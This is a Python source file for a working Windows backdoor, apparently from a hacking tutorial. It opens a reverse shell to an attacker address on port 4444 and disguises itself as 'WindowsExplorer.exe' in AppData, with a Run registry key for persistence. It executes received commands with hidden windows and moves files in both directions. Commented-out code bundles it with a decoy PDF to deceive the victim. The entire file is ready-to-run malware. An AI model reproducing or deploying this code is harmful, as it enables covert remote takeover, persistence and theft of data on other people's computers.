#!/usr/bin/env python

import socket                      #library to establish connection
import subprocess
import json
import os
import base64
import sys
import shutil					#shutil allows to copy file within directories

class Backdoor:
	def __init__(self,ip,port):
		self.persistent_part()							#to make it persistent immediatly after the file is executed.
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	#creating instance of the socket object. (predefined rules that needs to be passed as the arguments)
		self.connection.connect((ip,port))									#connect function connets to the ip specified and the port number that the listener is listening.
	
	def persistent_part(self):
		evil_file_location= os.environ["appdata"] + "\\WindowsExplorer.exe"	#finding the file location of the appdata directory to store the backdoor without any suspicion.
		if not os.path.exists(evil_file_location):								#check if the file is already present in the file location.
			shutil.copyfile(sys.executable, evil_file_location)					#sys.executable is given because the currect file is converted into executable. if it was a .py file, then "__file__" this will be used to denote the current file.
			subprocess.call('reg add HKCU\Software\Microsoft\windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell=True)	


	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data)	
																		# connection.send("\n [+]connection establish \n")
	
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data= json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	
	def execute_syscommand(self,command):
		try:
			DEVNULL = open(os.devnull, 'wb')					#this line is added as we are using python2.7. and inorder to hide the popup command line window, when this file is executed as a .exe. 
			return subprocess.check_output(command, shell=True, stderr= DEVNULL, stdin=DEVNULL)		#this is done(2 extra arguments stderr & stdin) as we use check_output function which uses stdinput and output which will make the command line popup.	#in python3 subprocess can be given within this line as a arguments.
		except subprocess.CalledProcessError:
			return "--error during command execution in target command line"

	def change_working_directory_to(self,path):
		os.chdir(path)										#os library function to change the directory
		return"[+] Changing working directoey to " + path
	
	def read_file(self,path):
		with open(path, "rb") as file:			#using with kwyword to access files. "r" to read the files. "b" to read the binary files as well.(eg, images etc)
			return base64.b64encode(file.read()) #encoding to b64 for transfering images.								#file is the variable used to reference the file that we have opened.

	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] upload successful."

	def run(self):
		while True:
			command=self.reliable_receive()							#recv is used to receive connection. and the argument passed is the buffer size.
																	#1024 bit can be received at as single time
			try:

				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "cd" and len(command) > 1:
					command_result= self.change_working_directory_to(command[1])
				elif command[0]=="download":
					command_result = self.read_file(command[1])
				elif command[0]== "upload":
					command_result = self.write_file(command[1], command[2])
				else:
					command_result= self.execute_syscommand(command)					#storing the input command and passing it to execute function
			except Exception:
				command_result = "[-] Error during command execution"
			self.reliable_send(command_result)						#sending the executed result back.


# file_name= sys._MEIPASS + "\case.pdf"           #this is used only when we wrap the malware along with the image and execute the image.
												#sys.MEIPASS will have the default location where the pyinstaller will store the image on the executed system .
# subprocess.Popen(file_name, shell=True)			#displaying the image to the victime.
try:														#while making a persistant connection, if attacker is not listeneing; then a warning message window will pop up on the victim machine which makes the user suspicious.
	my_backdoor = Backdoor("10.1.1.249",4444)				#this exception will exit silently if something like that happens.
						#enter the attacker/your ipaddress to establish the reverse connection, while executed.
	my_backdoor.run()
except Exception:
	sys.exit()